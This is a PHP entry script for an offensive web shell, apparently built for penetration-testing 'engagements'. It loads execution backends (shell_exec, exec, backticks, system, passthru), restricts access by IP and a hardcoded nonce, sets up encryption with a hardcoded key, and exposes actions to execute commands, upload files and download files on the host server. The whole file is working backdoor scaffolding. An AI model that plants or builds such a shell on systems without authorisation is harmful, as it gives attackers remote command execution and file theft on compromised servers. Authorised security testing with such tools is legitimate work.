<?php
namespace WebShell;

// Start or resume the session
session_start();

// Include all interfaces
include_once('src/Action.php');
include_once('src/ExecutionMethod.php');
include_once('src/Step.php');
include_once('src/Validator.php');

// Include Singleton superclass
include_once('src/Singleton.php');

// Include all ExecutionMethods
include_once('src/ExecutionMethod.php');
include_once('src/BlindExecutionMethod.php');

foreach (glob('src/*ExecutionMethod.php') as $filename) {
    include_once($filename);
}

// Include all Validators
foreach (glob('src/*Validator.php') as $filename) {
    include_once($filename);
}

// Include all Actions
foreach (glob('src/*Action.php') as $filename) {
    include_once($filename);
}

// Include all Services
foreach (glob('src/*Service.php') as $filename) {
    include_once($filename);
}

// Include all Steps
foreach (glob('src/*Step.php') as $filename) {
    include_once($filename);
}

// Include Request, RequestHandler and Bootstrapper
include_once('src/Request.php');
include_once('src/RequestHandler.php');
include_once('src/Bootstrapper.php');

// Bootstrap the application
$steps = [];

// Add IdentifyExecutionAlternativesSetp
$executionMethods = [
    new ShellExecExecutionMethod(),
    new ExecExecutionMethod(),
    new BackticksExecutionMethod(),
    new SystemExecutionMethod(),
    new PassthruExecutionMethod()
];
array_push($steps, new IdentifyExecutionAlternativesStep($executionMethods));

// Add all available validators
array_push($steps, new AddIPValidatorStep(['127.0.0.1', '::1' ]));
array_push($steps, new AddNonceValidatorStep('5cd6313bebd006dc5d19cf5175f9cba6'));

// Initialize security service. NOTE -> If used in real engagements, change the encryption key!!!!
$key = hex2bin('3b151a68047f4dcb2ba7a0fd58f670460366defdcce02236906e17f2332f6b64');
array_push($steps, new SetupEncryptionStep($key));

// Setup handler for all actions
$actions = [
    'execute_command' => new ExecuteCommandAction(),
    'upload_file' => new UploadFileAction(),
    'download_file' => new DownloadFileAction()
];
array_push($steps, new SetupRequestHandlerStep($actions));

// Launch the bootstrapping process
$bootstrapper = new Bootstrapper($steps);
$bootstrapper->launch();

// Handle requests
echo RequestHandler::getInstance()->handle();
?>
